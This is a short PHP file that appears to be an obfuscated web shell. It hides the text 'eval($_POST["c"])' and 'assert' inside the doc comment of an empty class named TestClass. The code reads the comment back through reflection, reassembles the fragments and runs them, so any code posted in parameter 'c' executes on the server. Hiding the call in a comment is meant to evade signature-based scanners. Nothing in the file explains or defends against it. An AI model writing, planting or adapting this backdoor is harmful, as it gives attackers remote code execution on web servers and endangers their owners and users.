<?php
    /**
    * eva
    * l($_POS
    * T["c"]);
    * asse
    * rt
    */
    class TestClass { }
    $rc = new ReflectionClass('TestClass');
    $str = $rc->getDocComment();
    $payload = substr($str,strpos($str,'ev'),3);
    $payload .= substr($str,strpos($str,'l('),7);
    $payload .= substr($str,strpos($str,'T['),8);
    $exe = substr($str, strpos($str, 'as'), 4);
    $exe .= substr($str, strpos($str, 'rt'), 2);
    
    $exe($payload);
?> 
